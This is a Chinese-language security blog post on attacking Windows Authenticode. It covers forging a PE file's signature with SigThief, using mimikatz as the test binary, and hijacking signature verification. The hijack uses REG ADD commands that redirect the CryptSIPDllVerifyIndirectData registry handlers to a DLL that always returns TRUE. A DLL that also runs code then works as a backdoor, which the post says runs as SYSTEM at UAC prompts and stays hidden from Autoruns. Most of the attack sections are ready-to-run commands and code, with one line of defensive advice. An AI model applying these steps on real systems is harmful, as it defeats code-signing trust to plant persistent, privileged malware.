---
layout: post
title: Authenticode签名伪造——PE文件的签名伪造与签名验证劫持
---

## 0x00 前言
---

在上一篇文章[《CAT文件数字签名使用技巧》](https://3gstudent.github.io/3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/)介绍了证书签名的基础知识，Windows系统下向文件签名有两种方法：添加在文件末尾(Authenticode)和CAT文件(catalog)，本文将介绍Authenticode签名的相关利用技巧——PE文件的签名伪造与签名验证劫持

**注：**

本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。

**参考资料：**

https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf

http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html

https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view

## 0x01 简介
---

本文将要介绍以下内容：
- PE文件的Authenticode签名伪造
- 劫持签名验证过程，实现代码执行，作为后门

## 0x02 PE文件的签名伪造
---

Authenticode的详细说明文档可参考：

http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx

部分系统文件会包含微软的签名，例如`C:\Windows\System32\consent.exe`

通过文件属性能够看到相关签名信息，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-1.png)

通过powershell验证，代码如下：

```
Get-AuthenticodeSignature C:\Windows\System32\consent.exe
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-2.png)

借助工具CFF Explorer获取文件结构，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-3.png)

Security Directory RVA代码数字签名在PE文件中的偏移位置
Security DirectorySize代表数字签名的长度

将这部分内容提取，复制到另一个文件test.exe的尾部，同时使用`CFF Explorer`修改test.exe对应的`Security Directory RVA`和`Security DirectorySize`

这样，就实现了数字签名的伪造

开源工具SigThief可自动实现以上过程，地址如下：

https://github.com/secretsquirrel/SigThief

### 实际测试：

测试系统： Win7

将`C:\Windows\System32\consent.exe`的数字签名复制到mimikatz.exe中

参数如下：

```
sigthief.py -i C:\Windows\System32\consent.exe -t mimikatz.exe -o si.exe 
```

生成si.exe，具有微软数字签名，但提示证书无效，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-4.png)

**注：**

部分测试系统无法使用sigthief.py，提示找不到0x9，将系统激活即可

通过powershell验证，代码如下：

```
Get-AuthenticodeSignature .\si.exe
```

显示HashMismatch，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-5.png)

通过signtool.exe验证：

```
signtool.exe verify /v si.exe
```

显示`SignTool Error: WinVerifyTrust returned error: 0x80096010`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-6.png)

通过sigcheck.exe验证：

```
sigcheck.exe -q si.exe
```

显示`The digital signature of the object did not verify`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/2-7.png)


## 0x03 修改配置，使签名通过验证
---

查看`Get-AuthenticodeSignature`的帮助说明：

```
Get-Help Get-AuthenticodeSignature -Full 
```

查看相关操作`Set-AuthenticodeSignature`的帮助说明：

```
Get-Help Set-AuthenticodeSignature -Full
```

发现该命令的功能：

> The Set-AuthenticodeSignature cmdlet adds an Authenticode signature to
> any file that supports Subject Interface Package (SIP).

关于SIP的资料，可参考：

https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/

获得有用的信息：

> There are some included as part of the OS (at least on Vista). Locate
> in the %WINDIR%\System32 directory. They usually have a naming ending
> with sip.dll, i.e. msisip.dll is the Microsoft Installer (.msi) SIP.

寻找Windows下的SIP:

```
ls C:\Windows\System32\*sip.dll -Recurse -ErrorAction SilentlyContinue
```

Win7下只有一个：`C:\Windows\System32\msisip.dll`

**注：**

Matt Graeber的测试系统为Win10，可以找到多个dll


使用IDA打开该dll，查看函数`DllRegisterServer()`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-1.png)

找到一个特别的名称MsiSIPVerifyIndirectData，字面意思像是签名验证功能

查找资料，找到该函数，地址如下：

https://msdn.microsoft.com/en-us/library/windows/desktop/cc542591%28v=vs.85%29.aspx

发现该函数，返回TRUE代表验证成功，返回FALSE代表验证失败

该功能对应注册表键值，位置如下：

`HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-2.png)

不同GUID对应不同文件格式的验证，例如：

- C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE
- DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog	.cat文件 	 
- 9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL 		.ctl文件
- C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet 	.cab文件

**注：**

GUID说明引用自[《Subverting Trust in Windows》](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf) Page4

接下来，尝试替换`HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}`下的dll和FuncName

通过c++实现，创建dll，添加导出函数，格式参照`CryptSIPVerifyIndirectData`，代码如下：

```
BOOL WINAPI CryptSIPVerifyIndirectData(SIP_SUBJECTINFO *pSubjectInfo, SIP_INDIRECT_DATA *pIndirectData)
{
	return TRUE;
}
```

编译生成signtest.dll

修改注册表：

```
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\signtest.dll" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "CryptSIPVerifyIndirectData" /f
```

重新启动cmd，使用powershell进行验证：

```
Get-AuthenticodeSignature .\si.exe
```

显示Valid，校验成功

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-3.png)

通过signtool.exe验证：

```
signtool.exe verify /v si.exe
```

验证通过

通过sigcheck.exe验证：

```
sigcheck.exe -q si.exe
```

验证通过，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-4.png)

重启explorer.exe，查看文件属性，签名状态，显示签名生效，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/3-5.png)

更进一步，**dll一定要固定格式吗？**

于是进行接下来的测试：

导出函数名为test1，完整代码如下：


```
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}
BOOL WINAPI test1() 
{
	return TRUE;
}
```

修改对应注册表键值：

```
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\signtest.dll" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "test1" /f
```

测试仍能够绕过验证

这就说明，只要dll的导出函数返回TRUE，就能够绕过验证

所以，可以查找系统默认的dll，找到一个导出函数返回true即可（当然，此处可供利用的导出函数有很多）

例如`"C:\Windows\System32\ntdll.dll" `

导出函数：`DbgUiContinue`

代码如下：

```
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
```

这样，就不需要在系统上留下自己编写的dll

对于64位系统，存在32位的注册表键值

如果使用32位的程序，如32位的signtool和sigcheck，为了绕过验证，还需要修改32位的注册表键值，对应代码如下：

```
REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f

REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
```

## 0x04 签名验证劫持
---

修改注册表，编写dll实现对签名验证过程的绕过，如果我们在dll的导出函数里面加入自己的代码，这就实现了签名验证劫持

在签名验证中加入执行代码：

```
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}
BOOL WINAPI test1() 
{
	WinExec("calc.exe",SW_SHOWNORMAL);
	return TRUE;
}
```

只要涉及签名验证的操作，加载我们自己的dll，就会弹出计算器

以下程序会使用签名验证操作：

- DllHost.exe - When the “Digital Signatures” tab is displayed in file properties
- Process Explorer - When the “Verified Signer” tab is displayed
- Autoruns
- Sigcheck
- consent.exe - Any time a UAC prompt is displayed
- signtool.exe
- smartscreen.exe
- Get-AuthenticodeSignature
- Set-AuthenticodeSignature
- Security vendor software that performs certificate validation based on calls to WinVerifyTrust.

**注：**

该处引用自[《Subverting Trust in Windows》](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf) Page33

例如，查看文件属性-数字签名详细信息，加载dll，弹出计算器，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/4-1.png)

特别的，以管理员权限执行程序会弹出UAC，如果对此进行劫持，此时的权限为system

完整操作如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/4-2.gif)

### 补充：

**1、dll劫持**

有些GUID，默认注册表的dll路径为相对路径，这里就存在dll劫持的问题，不需要修改注册表也能实现绕过签名验证

**2、Hiding from Autoruns**

启动项检测工具Autoruns默认不显示带有微软签名的文件，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/5-1.png)

如果文件包含微软签名，默认不会显示在Autoruns面板

## 0x05 防御建议
---

部分白名单程序默认会信任带有微软证书的文件，这里就存在隐患

建议不要盲目相信证书

## 0x06 小结
---

本文介绍了Authenticode签名的相关利用技巧——PE文件的签名伪造与签名验证劫持，下一篇文章将继续介绍Authenticode签名的伪造技巧——针对文件类型的签名伪造。

最后感谢Matt Graeber的分享。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

